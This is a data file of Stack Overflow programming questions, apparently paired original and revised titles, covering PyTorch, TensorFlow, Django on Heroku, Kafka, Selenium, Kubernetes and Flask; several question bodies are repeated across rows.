PyTorch autograd -- .clone() not helping with tensor indexing," I am using the autograd tool in PyTorch, and have found myself in a situation where I need to access the values in a 1D tensor by means of an integer index. Something like this: I am getting the following error message: I am in general, a bit skeptical about how using the cloned version of a variable is supposed to keep that variable in gradient computation. The variable itself is effectively not used in the computation of A, and so when you call A.backward(), it should not be part of that operation. I appreciate your help with this approach or if there is a better way to avoid losing the gradient history and still index through a 1D tensor with requires_grad=True!**Edit (September 15):**res is a list of zero-dimensional tensors containing squared values of 1 to 5. To concatenate in a single tensor containing [1.0, 4.0, ..., 25.0], I changed return Variable(torch.FloatTensor(res)) to torch.stack(res, dim=0), which produces tensor([ 1., 4., 9., 16., 25.], grad_fn=<StackBackward>).However, I am getting this new error, caused by the A.backward() line. <code>  def basic_fun(x_cloned): res = [] for i in range(len(x)): res.append(x_cloned[i] * x_cloned[i]) print(res) return Variable(torch.FloatTensor(res))def get_grad(inp, grad_var): A = basic_fun(inp) A.backward() return grad_var.gradx = Variable(torch.FloatTensor([1, 2, 3, 4, 5]), requires_grad=True)x_cloned = x.clone()print(get_grad(x_cloned, x)) [tensor(1., grad_fn=<ThMulBackward>), tensor(4., grad_fn=<ThMulBackward>), tensor(9., grad_fn=<ThMulBackward>), tensor(16., grad_fn=<ThMulBackward>), tensor(25., grad_fn=<ThMulBackward>)]Traceback (most recent call last): File ""/home/mhy/projects/pytorch-optim/predict.py"", line 74, in <module> print(get_grad(x_cloned, x)) File ""/home/mhy/projects/pytorch-optim/predict.py"", line 68, in get_grad A.backward() File ""/home/mhy/.local/lib/python3.5/site-packages/torch/tensor.py"", line 93, in backward torch.autograd.backward(self, gradient, retain_graph, create_graph) File ""/home/mhy/.local/lib/python3.5/site-packages/torch/autograd/__init__.py"", line 90, in backward allow_unreachable=True) # allow_unreachable flagRuntimeError: element 0 of tensors does not require grad and does not have a grad_fn Traceback (most recent call last): File ""<project_path>/playground.py"", line 22, in <module> print(get_grad(x_cloned, x)) File ""<project_path>/playground.py"", line 16, in get_grad A.backward() File ""/home/mhy/.local/lib/python3.5/site-packages/torch/tensor.py"", line 93, in backward torch.autograd.backward(self, gradient, retain_graph, create_graph) File ""/home/mhy/.local/lib/python3.5/site-packages/torch/autograd/__init__.py"", line 84, in backward grad_tensors = _make_grads(tensors, grad_tensors) File ""/home/mhy/.local/lib/python3.5/site-packages/torch/autograd/__init__.py"", line 28, in _make_grads raise RuntimeError(""grad can be implicitly created only for scalar outputs"")RuntimeError: grad can be implicitly created only for scalar outputs",PyTorch autograd -- grad can be implicitly created only for scalar outputs
"Tnesorflow - when use dataset.shuffle(180000), computer will freeze. What is a better way to achieve balanced batches?"," I am running my neural network on ubuntu 16.04, with 1 GPU (GTX 1070) and 4 CPUs.My dataset contains around 35,000 images, but the dataset is not balanced: class 0 has 90%, and class 1,2,3,4 share the other 10%. Therefore I over-sample class 1-4 by using dataset.repeat(class_weight) [I also use a function to apply random augmentation], and then concatenate them.The re-sampling strategy is: 1) At the very beginning, class_weight[n] will be set to a large number so that each class will have the same amount of images as class 0. 2) As the training goes, number of epochs increases, and the weights will drop according to the epoch number, so that the distribution becomes closer to the actual distribution. Because my class_weight will vary epoch by epoch, I can't shuffle the whole dataset at the very beginning. Instead, I have to take in data class by class, and shuffle the whole dataset after I concatenate the over-sampled data from each class. And, in order to achieve balanced batches, I have to element-wise shuffle the whole dataset. The following is part of my code. To make it clear, let me describe why I am facing this issue step by step:Because classes in my dataset are not balanced, I want to over-sample those minority classes.Because of 1., I want to apply random augmentation on those classes and concatenate the majority class (class 0) with them. After doing some research, I find that repeat() will generate different results if there is a random function in it, so I use repeat() along with my_random_augmentation_func to achieve 2.Now, having achieved 2., I want to combine all the datasets, so I use concatenate()After 4. I am now facing an issue: there are around 40,000 - 180,000 images in total (because class_weight changes epoch by epoch, at the beginning there will be 180,000 images in total, and finally there will be about 40,000), and they are concatenated class by class, the dataset will look like [0000-1111-2222-3333-4444], therefore with batch size 100, without any shuffling, there will almost always be only one class in each batch, which means the distribution in each batch will be imbalanced.In order to solve the ""imbalanced batch"" issue in 5., I come up with the idea that I should shuffle the whole dataset, thus I use shuffle(180000).And finally, boom, my computer freeze when it comes to shuffle 180000 items in the dataset.So, is there a better way that I can get balanced batches, but still keep the characteristics I want (e.g. changing distribution epoch by epoch) ? --- Edit: Issue solved ---It turned out that I should not apply the map function at the beginning. I should just take in the filenames instead of the real files, and just shuffle the filenames, then map them to the real files.More detailedly, delete the map(_parse_csv_train) part after d0 = tf.data.TextLineDataset(train_csv_0) and other 4 lines, and add a new line dataset = dataset.map(_parse_csv_train) after shuffle(180000).I also want to say thank you to @P-Gn , the blog link in his ""shuffling"" part is really helpful. It answered a question that was in my mind but I didn't ask: ""Can I get similar randomness by using many small shuffles v.s. one large shuffle?"" (I'm not gonna give an answer here, check that blog!) The method in that blog might also be a potential solution to this issue, but I haven't tried it out. <code>  def my_estimator_func(): d0 = tf.data.TextLineDataset(train_csv_0).map(_parse_csv_train) d1 = tf.data.TextLineDataset(train_csv_1).map(_parse_csv_train) d2 = tf.data.TextLineDataset(train_csv_2).map(_parse_csv_train) d3 = tf.data.TextLineDataset(train_csv_3).map(_parse_csv_train) d4 = tf.data.TextLineDataset(train_csv_4).map(_parse_csv_train) d1 = d1.repeat(class_weight[1]) d2 = d2.repeat(class_weight[2]) d3 = d3.repeat(class_weight[3]) d4 = d4.repeat(class_weight[4]) dataset = d0.concatenate(d1).concatenate(d2).concatenate(d3).concatenate(d4) dataset = dataset.shuffle(180000) # <- This is where the issue comes from dataset = dataset.batch(100) iterator = dataset.make_one_shot_iterator() feature, label = iterator.get_next() return feature, labeldef _parse_csv_train(line): parsed_line= tf.decode_csv(line, [[""""], []]) filename = parsed_line[0] label = parsed_line[1] image_string = tf.read_file(filename) image_decoded = tf.image.decode_jpeg(image_string, channels=3) # my_random_augmentation_func will apply random augmentation on the image. image_aug = my_random_augmentation_func(image_decoded) image_resized = tf.image.resize_images(image_aug, image_resize) return image_resized, label",How to mix unbalanced Datasets to reach a desired distribution per label?
"Tensorflow - when use dataset.shuffle(180000), computer will freeze. What is a better way to achieve balanced batches?"," I am running my neural network on ubuntu 16.04, with 1 GPU (GTX 1070) and 4 CPUs.My dataset contains around 35,000 images, but the dataset is not balanced: class 0 has 90%, and class 1,2,3,4 share the other 10%. Therefore I over-sample class 1-4 by using dataset.repeat(class_weight) [I also use a function to apply random augmentation], and then concatenate them.The re-sampling strategy is: 1) At the very beginning, class_weight[n] will be set to a large number so that each class will have the same amount of images as class 0. 2) As the training goes, number of epochs increases, and the weights will drop according to the epoch number, so that the distribution becomes closer to the actual distribution. Because my class_weight will vary epoch by epoch, I can't shuffle the whole dataset at the very beginning. Instead, I have to take in data class by class, and shuffle the whole dataset after I concatenate the over-sampled data from each class. And, in order to achieve balanced batches, I have to element-wise shuffle the whole dataset. The following is part of my code. To make it clear, let me describe why I am facing this issue step by step:Because classes in my dataset are not balanced, I want to over-sample those minority classes.Because of 1., I want to apply random augmentation on those classes and concatenate the majority class (class 0) with them. After doing some research, I find that repeat() will generate different results if there is a random function in it, so I use repeat() along with my_random_augmentation_func to achieve 2.Now, having achieved 2., I want to combine all the datasets, so I use concatenate()After 4. I am now facing an issue: there are around 40,000 - 180,000 images in total (because class_weight changes epoch by epoch, at the beginning there will be 180,000 images in total, and finally there will be about 40,000), and they are concatenated class by class, the dataset will look like [0000-1111-2222-3333-4444], therefore with batch size 100, without any shuffling, there will almost always be only one class in each batch, which means the distribution in each batch will be imbalanced.In order to solve the ""imbalanced batch"" issue in 5., I come up with the idea that I should shuffle the whole dataset, thus I use shuffle(180000).And finally, boom, my computer freeze when it comes to shuffle 180000 items in the dataset.So, is there a better way that I can get balanced batches, but still keep the characteristics I want (e.g. changing distribution epoch by epoch) ? --- Edit: Issue solved ---It turned out that I should not apply the map function at the beginning. I should just take in the filenames instead of the real files, and just shuffle the filenames, then map them to the real files.More detailedly, delete the map(_parse_csv_train) part after d0 = tf.data.TextLineDataset(train_csv_0) and other 4 lines, and add a new line dataset = dataset.map(_parse_csv_train) after shuffle(180000).I also want to say thank you to @P-Gn , the blog link in his ""shuffling"" part is really helpful. It answered a question that was in my mind but I didn't ask: ""Can I get similar randomness by using many small shuffles v.s. one large shuffle?"" (I'm not gonna give an answer here, check that blog!) The method in that blog might also be a potential solution to this issue, but I haven't tried it out. <code>  def my_estimator_func(): d0 = tf.data.TextLineDataset(train_csv_0).map(_parse_csv_train) d1 = tf.data.TextLineDataset(train_csv_1).map(_parse_csv_train) d2 = tf.data.TextLineDataset(train_csv_2).map(_parse_csv_train) d3 = tf.data.TextLineDataset(train_csv_3).map(_parse_csv_train) d4 = tf.data.TextLineDataset(train_csv_4).map(_parse_csv_train) d1 = d1.repeat(class_weight[1]) d2 = d2.repeat(class_weight[2]) d3 = d3.repeat(class_weight[3]) d4 = d4.repeat(class_weight[4]) dataset = d0.concatenate(d1).concatenate(d2).concatenate(d3).concatenate(d4) dataset = dataset.shuffle(180000) # <- This is where the issue comes from dataset = dataset.batch(100) iterator = dataset.make_one_shot_iterator() feature, label = iterator.get_next() return feature, labeldef _parse_csv_train(line): parsed_line= tf.decode_csv(line, [[""""], []]) filename = parsed_line[0] label = parsed_line[1] image_string = tf.read_file(filename) image_decoded = tf.image.decode_jpeg(image_string, channels=3) # my_random_augmentation_func will apply random augmentation on the image. image_aug = my_random_augmentation_func(image_decoded) image_resized = tf.image.resize_images(image_aug, image_resize) return image_resized, label",How to mix unbalanced Datasets to reach a desired distribution per label?
How to generate dynamic function name & called them using user input in python," I have 10 to 20 function with prefix name same, & I have to call them as per user input, But am not getting how to call them, I tried using below method but it's not working, Can anyone tell me how should I make function callable. When I run above code am getting below error  <code>  def pattern_1(no): print('First Pattern with ' +str(no)+ ' rows')def pattern_2(no): print('Second Pattern with ' +str(no)+ ' rows')rows = eval(input('Enter number of rows: '))pattern_no = eval(input('Enter pattern num [1-10]: '))cust_fun_name = 'pattern_' + str(pattern_no)print(cust_fun_name) # Here its print pattern_2 but why function is not get invokedcust_fun_name() Traceback (most recent call last): File ""/home/main.py"", line 22, in <module> cust_fun_name() TypeError: 'str' object is not callable",How to generate dynamic function name and call it using user input in Python
How to use pdfminer.six's pdf2txt.py in python script and outside command line? (python 3.6)," I know how to use pdfminer.six's pdf2txt.py tool in command line; however, I have many PDF files to convert to txt files and I can't just do it one-by-one in command line. I haven't found how to use this tool in actual python script. Any ideas? <code> ",How to use pdfminer.six's pdf2txt.py in python script and outside command line?
ResourceWarning: subprocess is still running," Following the advice from How to terminate a python subprocess launched with shell=TrueI have a process that I start with the following my_cmd is in the form of some_cmd_that_periodically_outputs_to_stdout | grep ""some_fancy_regex"" > some_output_file.txtI kill the process with the following After killing, I get the following warning Why am I getting this warning? <code>  process = subprocess.Popen(my_cmd, shell=True, executable='/bin/bash', preexec_fn=os.setsid) os.killpg(os.getpgid(process.pid), signal.SIGKILL) ResourceWarning: subprocess XXX is still running",Killing shell=True process results in ResourceWarning: subprocess is still running
Django: request.user.is_authenticated renders True and then False on refresh after authentication on Heroku," Users keep getting logged out and sessions are not persisting on my Django app on Heroku. Users can log in, but they will be randomly logged outeven on the /admin/ site.Is there anything I'm doing wrong with my Django/Heroku config?Currently running Django 1.11.16 on Standard Dynos.settings.py <code>  SECRET_KEY = os.environ.get(""SECRET_KEY"", """".join(random.choice(string.printable) for i in range(40)))SESSION_COOKIE_DOMAIN = "".appname.com""CSRF_COOKIE_DOMAIN = "".appname.com""SECURE_SSL_REDIRECT = True# ...MIDDLEWARE_CLASSES = [ 'django.middleware.security.SecurityMiddleware', 'django.contrib.sessions.middleware.SessionMiddleware', 'django.middleware.common.CommonMiddleware', 'django.middleware.csrf.CsrfViewMiddleware', 'django.contrib.auth.middleware.AuthenticationMiddleware', 'django.contrib.auth.middleware.SessionAuthenticationMiddleware', 'django.contrib.messages.middleware.MessageMiddleware', 'django.middleware.clickjacking.XFrameOptionsMiddleware',]TEMPLATES = [ { 'BACKEND': 'django.template.backends.django.DjangoTemplates', 'DIRS': [os.path.join(BASE_DIR, 'templates/')], 'APP_DIRS': True, 'OPTIONS': { 'context_processors': [ 'django.template.context_processors.debug', 'django.template.context_processors.request', 'django.template.context_processors.csrf', 'django.contrib.auth.context_processors.auth', 'django.contrib.messages.context_processors.messages', ], }, },]# ...DATABASES = { 'default': { 'ENGINE': 'django.db.backends.postgresql_psycopg2', 'NAME': 'appname', }}# https://devcenter.heroku.com/articles/python-concurrency-and-database-connectionsdb_from_env = dj_database_url.config(conn_max_age=500)DATABASES['default'].update(db_from_env)",Django: Sessions not working as expected on Heroku
Django: User sessions are not persisting on Heroku," Users keep getting logged out and sessions are not persisting on my Django app on Heroku. Users can log in, but they will be randomly logged outeven on the /admin/ site.Is there anything I'm doing wrong with my Django/Heroku config?Currently running Django 1.11.16 on Standard Dynos.settings.py <code>  SECRET_KEY = os.environ.get(""SECRET_KEY"", """".join(random.choice(string.printable) for i in range(40)))SESSION_COOKIE_DOMAIN = "".appname.com""CSRF_COOKIE_DOMAIN = "".appname.com""SECURE_SSL_REDIRECT = True# ...MIDDLEWARE_CLASSES = [ 'django.middleware.security.SecurityMiddleware', 'django.contrib.sessions.middleware.SessionMiddleware', 'django.middleware.common.CommonMiddleware', 'django.middleware.csrf.CsrfViewMiddleware', 'django.contrib.auth.middleware.AuthenticationMiddleware', 'django.contrib.auth.middleware.SessionAuthenticationMiddleware', 'django.contrib.messages.middleware.MessageMiddleware', 'django.middleware.clickjacking.XFrameOptionsMiddleware',]TEMPLATES = [ { 'BACKEND': 'django.template.backends.django.DjangoTemplates', 'DIRS': [os.path.join(BASE_DIR, 'templates/')], 'APP_DIRS': True, 'OPTIONS': { 'context_processors': [ 'django.template.context_processors.debug', 'django.template.context_processors.request', 'django.template.context_processors.csrf', 'django.contrib.auth.context_processors.auth', 'django.contrib.messages.context_processors.messages', ], }, },]# ...DATABASES = { 'default': { 'ENGINE': 'django.db.backends.postgresql_psycopg2', 'NAME': 'appname', }}# https://devcenter.heroku.com/articles/python-concurrency-and-database-connectionsdb_from_env = dj_database_url.config(conn_max_age=500)DATABASES['default'].update(db_from_env)",Django: Sessions not working as expected on Heroku
Django: Django sessions not persisting on Heroku with Redis and django.contrib.sessions.backends.cached_db," Users keep getting logged out and sessions are not persisting on my Django app on Heroku. Users can log in, but they will be randomly logged outeven on the /admin/ site.Is there anything I'm doing wrong with my Django/Heroku config?Currently running Django 1.11.16 on Standard Dynos.settings.py <code>  SECRET_KEY = os.environ.get(""SECRET_KEY"", """".join(random.choice(string.printable) for i in range(40)))SESSION_COOKIE_DOMAIN = "".appname.com""CSRF_COOKIE_DOMAIN = "".appname.com""SECURE_SSL_REDIRECT = True# ...MIDDLEWARE_CLASSES = [ 'django.middleware.security.SecurityMiddleware', 'django.contrib.sessions.middleware.SessionMiddleware', 'django.middleware.common.CommonMiddleware', 'django.middleware.csrf.CsrfViewMiddleware', 'django.contrib.auth.middleware.AuthenticationMiddleware', 'django.contrib.auth.middleware.SessionAuthenticationMiddleware', 'django.contrib.messages.middleware.MessageMiddleware', 'django.middleware.clickjacking.XFrameOptionsMiddleware',]TEMPLATES = [ { 'BACKEND': 'django.template.backends.django.DjangoTemplates', 'DIRS': [os.path.join(BASE_DIR, 'templates/')], 'APP_DIRS': True, 'OPTIONS': { 'context_processors': [ 'django.template.context_processors.debug', 'django.template.context_processors.request', 'django.template.context_processors.csrf', 'django.contrib.auth.context_processors.auth', 'django.contrib.messages.context_processors.messages', ], }, },]# ...DATABASES = { 'default': { 'ENGINE': 'django.db.backends.postgresql_psycopg2', 'NAME': 'appname', }}# https://devcenter.heroku.com/articles/python-concurrency-and-database-connectionsdb_from_env = dj_database_url.config(conn_max_age=500)DATABASES['default'].update(db_from_env)",Django: Sessions not working as expected on Heroku
Django: How to keep users logged in on Heroku with Redis?," Users keep getting logged out and sessions are not persisting on my Django app on Heroku. Users can log in, but they will be randomly logged outeven on the /admin/ site.Is there anything I'm doing wrong with my Django/Heroku config?Currently running Django 1.11.16 on Standard Dynos.settings.py <code>  SECRET_KEY = os.environ.get(""SECRET_KEY"", """".join(random.choice(string.printable) for i in range(40)))SESSION_COOKIE_DOMAIN = "".appname.com""CSRF_COOKIE_DOMAIN = "".appname.com""SECURE_SSL_REDIRECT = True# ...MIDDLEWARE_CLASSES = [ 'django.middleware.security.SecurityMiddleware', 'django.contrib.sessions.middleware.SessionMiddleware', 'django.middleware.common.CommonMiddleware', 'django.middleware.csrf.CsrfViewMiddleware', 'django.contrib.auth.middleware.AuthenticationMiddleware', 'django.contrib.auth.middleware.SessionAuthenticationMiddleware', 'django.contrib.messages.middleware.MessageMiddleware', 'django.middleware.clickjacking.XFrameOptionsMiddleware',]TEMPLATES = [ { 'BACKEND': 'django.template.backends.django.DjangoTemplates', 'DIRS': [os.path.join(BASE_DIR, 'templates/')], 'APP_DIRS': True, 'OPTIONS': { 'context_processors': [ 'django.template.context_processors.debug', 'django.template.context_processors.request', 'django.template.context_processors.csrf', 'django.contrib.auth.context_processors.auth', 'django.contrib.messages.context_processors.messages', ], }, },]# ...DATABASES = { 'default': { 'ENGINE': 'django.db.backends.postgresql_psycopg2', 'NAME': 'appname', }}# https://devcenter.heroku.com/articles/python-concurrency-and-database-connectionsdb_from_env = dj_database_url.config(conn_max_age=500)DATABASES['default'].update(db_from_env)",Django: Sessions not working as expected on Heroku
Django: Sessions not working on Heroku with Redis?," Users keep getting logged out and sessions are not persisting on my Django app on Heroku. Users can log in, but they will be randomly logged outeven on the /admin/ site.Is there anything I'm doing wrong with my Django/Heroku config?Currently running Django 1.11.16 on Standard Dynos.settings.py <code>  SECRET_KEY = os.environ.get(""SECRET_KEY"", """".join(random.choice(string.printable) for i in range(40)))SESSION_COOKIE_DOMAIN = "".appname.com""CSRF_COOKIE_DOMAIN = "".appname.com""SECURE_SSL_REDIRECT = True# ...MIDDLEWARE_CLASSES = [ 'django.middleware.security.SecurityMiddleware', 'django.contrib.sessions.middleware.SessionMiddleware', 'django.middleware.common.CommonMiddleware', 'django.middleware.csrf.CsrfViewMiddleware', 'django.contrib.auth.middleware.AuthenticationMiddleware', 'django.contrib.auth.middleware.SessionAuthenticationMiddleware', 'django.contrib.messages.middleware.MessageMiddleware', 'django.middleware.clickjacking.XFrameOptionsMiddleware',]TEMPLATES = [ { 'BACKEND': 'django.template.backends.django.DjangoTemplates', 'DIRS': [os.path.join(BASE_DIR, 'templates/')], 'APP_DIRS': True, 'OPTIONS': { 'context_processors': [ 'django.template.context_processors.debug', 'django.template.context_processors.request', 'django.template.context_processors.csrf', 'django.contrib.auth.context_processors.auth', 'django.contrib.messages.context_processors.messages', ], }, },]# ...DATABASES = { 'default': { 'ENGINE': 'django.db.backends.postgresql_psycopg2', 'NAME': 'appname', }}# https://devcenter.heroku.com/articles/python-concurrency-and-database-connectionsdb_from_env = dj_database_url.config(conn_max_age=500)DATABASES['default'].update(db_from_env)",Django: Sessions not working as expected on Heroku
"Django: Sessions not working, users continually being logged out and prompted to log back in"," Users keep getting logged out and sessions are not persisting on my Django app on Heroku. Users can log in, but they will be randomly logged outeven on the /admin/ site.Is there anything I'm doing wrong with my Django/Heroku config?Currently running Django 1.11.16 on Standard Dynos.settings.py <code>  SECRET_KEY = os.environ.get(""SECRET_KEY"", """".join(random.choice(string.printable) for i in range(40)))SESSION_COOKIE_DOMAIN = "".appname.com""CSRF_COOKIE_DOMAIN = "".appname.com""SECURE_SSL_REDIRECT = True# ...MIDDLEWARE_CLASSES = [ 'django.middleware.security.SecurityMiddleware', 'django.contrib.sessions.middleware.SessionMiddleware', 'django.middleware.common.CommonMiddleware', 'django.middleware.csrf.CsrfViewMiddleware', 'django.contrib.auth.middleware.AuthenticationMiddleware', 'django.contrib.auth.middleware.SessionAuthenticationMiddleware', 'django.contrib.messages.middleware.MessageMiddleware', 'django.middleware.clickjacking.XFrameOptionsMiddleware',]TEMPLATES = [ { 'BACKEND': 'django.template.backends.django.DjangoTemplates', 'DIRS': [os.path.join(BASE_DIR, 'templates/')], 'APP_DIRS': True, 'OPTIONS': { 'context_processors': [ 'django.template.context_processors.debug', 'django.template.context_processors.request', 'django.template.context_processors.csrf', 'django.contrib.auth.context_processors.auth', 'django.contrib.messages.context_processors.messages', ], }, },]# ...DATABASES = { 'default': { 'ENGINE': 'django.db.backends.postgresql_psycopg2', 'NAME': 'appname', }}# https://devcenter.heroku.com/articles/python-concurrency-and-database-connectionsdb_from_env = dj_database_url.config(conn_max_age=500)DATABASES['default'].update(db_from_env)",Django: Sessions not working as expected on Heroku
Django: Login or sessions not working on Heroku," Users keep getting logged out and sessions are not persisting on my Django app on Heroku. Users can log in, but they will be randomly logged outeven on the /admin/ site.Is there anything I'm doing wrong with my Django/Heroku config?Currently running Django 1.11.16 on Standard Dynos.settings.py <code>  SECRET_KEY = os.environ.get(""SECRET_KEY"", """".join(random.choice(string.printable) for i in range(40)))SESSION_COOKIE_DOMAIN = "".appname.com""CSRF_COOKIE_DOMAIN = "".appname.com""SECURE_SSL_REDIRECT = True# ...MIDDLEWARE_CLASSES = [ 'django.middleware.security.SecurityMiddleware', 'django.contrib.sessions.middleware.SessionMiddleware', 'django.middleware.common.CommonMiddleware', 'django.middleware.csrf.CsrfViewMiddleware', 'django.contrib.auth.middleware.AuthenticationMiddleware', 'django.contrib.auth.middleware.SessionAuthenticationMiddleware', 'django.contrib.messages.middleware.MessageMiddleware', 'django.middleware.clickjacking.XFrameOptionsMiddleware',]TEMPLATES = [ { 'BACKEND': 'django.template.backends.django.DjangoTemplates', 'DIRS': [os.path.join(BASE_DIR, 'templates/')], 'APP_DIRS': True, 'OPTIONS': { 'context_processors': [ 'django.template.context_processors.debug', 'django.template.context_processors.request', 'django.template.context_processors.csrf', 'django.contrib.auth.context_processors.auth', 'django.contrib.messages.context_processors.messages', ], }, },]# ...DATABASES = { 'default': { 'ENGINE': 'django.db.backends.postgresql_psycopg2', 'NAME': 'appname', }}# https://devcenter.heroku.com/articles/python-concurrency-and-database-connectionsdb_from_env = dj_database_url.config(conn_max_age=500)DATABASES['default'].update(db_from_env)",Django: Sessions not working as expected on Heroku
Django: Sessions not working on Heroku/Redis," Users keep getting logged out and sessions are not persisting on my Django app on Heroku. Users can log in, but they will be randomly logged outeven on the /admin/ site.Is there anything I'm doing wrong with my Django/Heroku config?Currently running Django 1.11.16 on Standard Dynos.settings.py <code>  SECRET_KEY = os.environ.get(""SECRET_KEY"", """".join(random.choice(string.printable) for i in range(40)))SESSION_COOKIE_DOMAIN = "".appname.com""CSRF_COOKIE_DOMAIN = "".appname.com""SECURE_SSL_REDIRECT = True# ...MIDDLEWARE_CLASSES = [ 'django.middleware.security.SecurityMiddleware', 'django.contrib.sessions.middleware.SessionMiddleware', 'django.middleware.common.CommonMiddleware', 'django.middleware.csrf.CsrfViewMiddleware', 'django.contrib.auth.middleware.AuthenticationMiddleware', 'django.contrib.auth.middleware.SessionAuthenticationMiddleware', 'django.contrib.messages.middleware.MessageMiddleware', 'django.middleware.clickjacking.XFrameOptionsMiddleware',]TEMPLATES = [ { 'BACKEND': 'django.template.backends.django.DjangoTemplates', 'DIRS': [os.path.join(BASE_DIR, 'templates/')], 'APP_DIRS': True, 'OPTIONS': { 'context_processors': [ 'django.template.context_processors.debug', 'django.template.context_processors.request', 'django.template.context_processors.csrf', 'django.contrib.auth.context_processors.auth', 'django.contrib.messages.context_processors.messages', ], }, },]# ...DATABASES = { 'default': { 'ENGINE': 'django.db.backends.postgresql_psycopg2', 'NAME': 'appname', }}# https://devcenter.heroku.com/articles/python-concurrency-and-database-connectionsdb_from_env = dj_database_url.config(conn_max_age=500)DATABASES['default'].update(db_from_env)",Django: Sessions not working as expected on Heroku
When python performs type conversion?, Why does Python return True when I compare int and float objects which have the same value?For example: <code>  >>> 5*2 == 5.0*2.0True,When does Python perform type conversion when comparing int and float?
pytest-django overwrite django_db_setup in live_server fixture," I need to add fixtures to the live_server fixture provided by pytest-django specifically an overwritten django_db_setup.That being said I understand it is not ideal to run tests against a db that isn't flushed clean but it is what I am working with.In our normal test suite we use overwrite the django_db_setup to do nothing in our conftest.py file as follows It appears that when I use the live_server fixture provided by pytest-django it does not honor this as it attempts to flush the db at the end of the tests. How would one go about circumventing this? I've found an end around shown below but I'd like to avoid it if there is a better solution. <code>  @pytest.fixture(scope=""session"")def django_db_setup(): pass @pytest.fixture(scope='session')def my_live_server(request): request.getfixturevalue('django_db_setup') return live_server(request)",pytest-django add fixtures to live_server fixture
Kafka publisher difference between flush and poll," We have a Kafka consumer which will read messages and do so stuff and again publish to Kafka topic using below scriptproducer config : I haven't configured any other configuration like queue.buffering.max.messages queue.buffering.max.ms batch.num.messagesI am assuming these all will be going to be default values from configuration my understanding : When internal queue reaches either of queue.buffering.max.ms or batch.num.messages messages will get published to Kafka in separate thread. in my configuration queue.buffering.max.ms is 0, so every message will be published as soon as when I call produce(). correct me if I am wrong.My producer snippet: from this post i understand that using flush after every message, producer is going to be sync producer . if I use above script it is taking ~ 45ms to publish to KafkaIf I change above snippet to Is there any performance will be improved ? Can you clarify my understanding.Thanks <code>  { ""bootstrap.servers"": ""localhost:9092""} queue.buffering.max.messages : 100000queue.buffering.max.ms : 0batch.num.messages : 10000 def send(topic, message): p.produce(topic, json.dumps(message), callback=delivery_callback(err, msg)) p.flush() def send(topic, message): p.produce(topic, json.dumps(message), callback=delivery_callback(err, msg)) p.poll(0)",Kafka producer difference between flush and poll
how to sleep webdriver in python for milliseconds," I am using the time library in my script: It can sleep my Selenium WebDriver for one second, but how is it possible for 250 milliseconds? <code>  import timetime.sleep(1)",How to sleep Selenium WebDriver in Python for milliseconds
How to sleep webdriver in python for milliseconds," I am using the time library in my script: It can sleep my Selenium WebDriver for one second, but how is it possible for 250 milliseconds? <code>  import timetime.sleep(1)",How to sleep Selenium WebDriver in Python for milliseconds
"Details about process of ""torch.optim.SGD"""," While training, I'd like to know the value of learning_rate.What should I do?It's my code, like this: Thank you. <code>  my_optimizer = torch.optim.SGD(my_model.parameters(), lr=0.001, momentum=0.99, weight_decay=2e-3)",PyTorch - How to get learning rate during training?
Keras utilises less CPU when number of workers grows when numpy generates a large array," My code uses a relatively extensive augmentation strategy, but I've noticed CPU utilisation isn't proportionate when N in fit_generator(...workers=N) increases. I have a 4-core CPU.When N=1, htop shows around 105% usageWhen N=2, htop shows around 202% usageWhen N=3, htop shows around 287% usageWhen N=4, htop shows around 342% usageGPU usage is less than 40% throughout.If I trim down the augmentation strategy to omit noise addition, I can achieve around 360% and higher GPU usage when N=4. Noise is added byx += numpy.random.normal(0, noise_sigma, x.shape) / 255.0where x is a 640x480 BGR input image. It is a slow call, averaging around 24.3ms per call, but shouldn't the CPU still do the work when N=4? How come numpy seems to be blocking other threads when it generates a large array of random numbers? <code> ",Keras utilises less CPU when number of workers grows and numpy generates a large array
How to find all Kubernetes Pods on the same node from a Pod?," How can I get a list of the pods running on the same Kubernetes node as my own (privileged) pod, using the official Python Kubernetes client? That is, how can a pod identify the concrete Kubernetes node it is running on and then query for a full list of pods on this node only? <code> ",How to find all Kubernetes Pods on the same node from a Pod using the official Python client?
"Get a list of lists, iterating a list of lists - python"," I have a list of lists like this, I want to iterate through the big_list and check each list values against the sec_list. While I check, I want to store the values that are not matching into a another list of lists. So, I did this: I get the result like this: However, I need a list of lists like this, How can I achieve this? <code>  big_list = [[1,3,5], [1,2,5], [9,3,5]]sec_list = [1,3,5] sma_list = []for each in big_list: for i,j in zip(each, sec_list): if i!=j: sma_list.append(i) [2, 9] [[2], [9]]","Get a list of lists, iterating a list of lists"
How do i run at the same time a Python script inside a Flask script?," I have a Flask script which creates a website and prints some data dynamically. - The data which it prints should come from another python script.The current problem that I'm facing is that if I put the line that executes the python script before the line that executes the Flask app, it will run the Python script without running Flask; and vice versa.Python script: Flask script (NB: price should be the variable 'parsed' from the other script): <code>  import websocketfrom bitmex_websocket import Instrumentfrom bitmex_websocket.constants import InstrumentChannelsfrom bitmex_websocket.constants import Channelsimport jsonwebsocket.enableTrace(True)sells = 0buys = 0channels = [ InstrumentChannels.trade,]XBTUSD = Instrument(symbol='XBTUSD', channels=channels)XBTUSD.on('action', lambda msg: test(msg))def test(msg): parsed = json.loads(json.dumps(msg)) print(parsed)XBTUSD.run_forever() # Start with a basic flask app webpage.from flask_socketio import SocketIO, emitfrom flask import Flask, render_template, url_for, copy_current_request_contextfrom random import randomfrom time import sleepfrom threading import Thread, Eventimport requests, jsonimport time__author__ = 'slynn'app = Flask(__name__)app.config['SECRET_KEY'] = 'secret!'app.config['DEBUG'] = True#turn the flask app into a socketio appsocketio = SocketIO(app)#random number Generator Threadthread = Thread()thread_stop_event = Event()class RandomThread(Thread): def __init__(self): self.delay = 1 super(RandomThread, self).__init__() def randomNumberGenerator(self): while not thread_stop_event.isSet(): socketio.emit('newnumber', {'number': parsed}, namespace='/test') sleep(self.delay) def run(self): self.randomNumberGenerator()@app.route('/')def index(): #only by sending this page first will the client be connected to the socketio instance return render_template('index.html')@socketio.on('connect', namespace='/test')def test_connect(): # need visibility of the global thread object global thread print('Client connected') #Start the random number generator thread only if the thread has not been started before. if not thread.isAlive(): print(""Starting Thread"") thread = RandomThread() thread.start()@socketio.on('disconnect', namespace='/test')def test_disconnect(): print('Client disconnected')if __name__ == '__main__': socketio.run(app)",How can I run a python script from within Flask
